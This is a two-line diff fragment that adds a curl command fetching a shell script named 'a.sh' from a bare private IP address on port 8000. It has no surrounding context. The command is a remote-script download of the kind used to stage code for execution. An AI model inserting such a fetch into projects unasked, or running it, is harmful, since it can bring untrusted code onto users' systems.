@@ -1,0 +1,2 @@
+curl -fsS --max-time 5 \
+http://192.168.0.108:8000/a.sh
